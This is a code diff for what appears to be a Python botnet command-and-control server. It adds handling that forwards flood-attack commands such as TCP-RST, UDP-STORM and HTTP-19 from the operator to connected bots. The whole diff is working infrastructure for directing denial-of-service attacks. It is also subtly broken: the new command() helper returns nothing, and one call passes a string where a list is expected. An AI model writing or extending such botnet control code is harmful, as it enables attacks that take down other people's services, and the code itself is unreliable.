@@ -101,6 +101,21 @@ def bot_sent(com):
       except:pass
   return message
 
+def command(com):
+  length = []
+  total = 1
+  while True:
+    try:
+      length.append(com[total])
+      total += 1
+    except:break
+
+def sent_packet(length,s):
+  for a in bot_sent(' '.join(length)):
+    s.sendall(a.encode())
+    if len(bots) != 1:s.send(b'\r\n\r\n')
+    else:s.send(b'\r\n')
+
 def client_command(s,u):
   try:
     time.sleep(1)
@@ -114,19 +129,16 @@ def client_command(s,u):
       com = data.upper().split(' ')
       if not data:continue
       if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
+      elif com[0] in ['TCP-RST','TCP_RESET','TCP_RST','TCP-RESET','UDP-STORM','UDPSTORM','UDP_STORM','HTTP-19','HTTP','H19','HTTP_19','STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
+       if len(com) != 1:
+         all_com = command(com)
+         sent_packet(all_com,s)
+       else:
+         sent_packet(com[0],s)
       elif com[0] == 'BOTS':
         if len(com) != 1:
-         length = []
-         total = 1
-         while True:
-          try:
-            length.append(com[total])
-            total += 1
-          except:break
-         for a in bot_sent(' '.join(length)):
-          s.sendall(a.encode())
-          if len(bots) != 1:s.send(b'\r\n\r\n')
-          else:s.send(b'\r\n')
+         all_com = command(com)
+         sent_packet(all_com,s)
         else:
           s.send(f'\x1b[38;5;196mBOTS \x1b[38;5;76m<\x1b[38;5;77mCOMMAND\x1b[38;5;76m>'.encode())
       elif com[0] == 'MENU':
